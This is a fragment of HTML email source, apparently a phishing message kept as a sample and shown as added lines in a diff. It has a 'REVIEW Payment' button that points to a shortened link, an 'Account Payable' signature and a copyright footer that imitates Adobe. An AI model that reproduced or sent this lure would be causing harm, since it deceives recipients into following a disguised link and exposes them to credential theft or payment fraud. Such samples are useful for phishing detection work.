+x; PADDING-LEFT: 24px; DISPLAY: inline-block; PADDING-RIGHT: 24px; BACKGROU=
+ND-COLOR: rgb(255,80,1); border-radius: 5px; text-size-adjust: 100%" href=
+=3D"https://t.co/BJ1bhLrpL1" rel=3Dnoreferrer target=3D_blank>REVIEW&nbsp;P=
+ayment</A></DIV>
+<P style=3D"BOX-SIZING: border-box; FONT-SIZE: 14px; FONT-FAMILY: Verdana, =
+Geneva, sans-serif; FONT-WEIGHT: normal; COLOR: rgb(34,34,34); PADDING-BOTT=
+OM: 0px; TEXT-ALIGN: left; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 10p=
+x 0px; LINE-HEIGHT: 17px; PADDING-RIGHT: 0px; text-size-adjust: 100%">This =
+email was sent from an unmonitored mailbox. do not reply this automated ema=
+il</P>
+<P style=3D"BOX-SIZING: border-box; FONT-SIZE: 14px; FONT-FAMILY: Verdana, =
+Geneva, sans-serif; FONT-WEIGHT: normal; COLOR: rgb(34,34,34); PADDING-BOTT=
+OM: 0px; TEXT-ALIGN: left; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 10p=
+x 0px; LINE-HEIGHT: 17px; PADDING-RIGHT: 0px; text-size-adjust: 100%">Best =
+regards,<BR style=3D"BOX-SIZING: border-box">Account Payable</P></DIV></DIV=
+></TD></TR></TBODY></TABLE></TD></TR></TBODY></TABLE></TD></TR></TBODY></TA=
+BLE></TD></TR>
+<TR style=3D"BOX-SIZING: border-box">
+<TD id=3Dv1templateFooter style=3D"BOX-SIZING: border-box; BORDER-TOP: 0px;=
+ BORDER-BOTTOM: 0px; text-size-adjust: 100%" vAlign=3Dtop>
+<TABLE class=3Dv1mcnTextBlock style=3D"BOX-SIZING: border-box; BORDER-COLLA=
+PSE: collapse; MIN-WIDTH: 100%; text-size-adjust: 100%" cellSpacing=3D0 cel=
+lPadding=3D0 width=3D"100%" border=3D0>
+<TBODY class=3Dv1mcnTextBlockOuter style=3D"BOX-SIZING: border-box">
+<TR style=3D"BOX-SIZING: border-box">
+<TD class=3Dv1mcnTextBlockInner style=3D"BOX-SIZING: border-box; PADDING-TO=
+P: 9px; text-size-adjust: 100%" vAlign=3Dtop>
+<TABLE class=3Dv1mcnTextContentContainer style=3D"BOX-SIZING: border-box; M=
+AX-WIDTH: 100%; BORDER-COLLAPSE: collapse; MIN-WIDTH: 100%; FLOAT: left; te=
+xt-size-adjust: 100%" cellSpacing=3D0 cellPadding=3D0 width=3D"100%" align=
+=3Dleft border=3D0>
+<TBODY style=3D"BOX-SIZING: border-box">
+<TR style=3D"BOX-SIZING: border-box">
+<TD class=3Dv1mcnTextContent style=3D"BOX-SIZING: border-box; FONT-SIZE: 12=
+px; FONT-FAMILY: Helvetica; COLOR: rgb(32,32,32); PADDING-BOTTOM: 9px; TEXT=
+-ALIGN: left; PADDING-TOP: 0px; PADDING-LEFT: 18px; LINE-HEIGHT: 18px; PADD=
+ING-RIGHT: 18px; text-size-adjust: 100%" vAlign=3Dtop><EM style=3D"BOX-SIZI=
+NG: border-box"><STRONG>Copyright &copy; 2026 adobe system integrated</STRO=
+NG></EM></TD></TR></TBODY></TABLE></TD></TR></TBODY></TABLE></TD></TR></TBO=
+DY></TABLE></BODY></HTML>
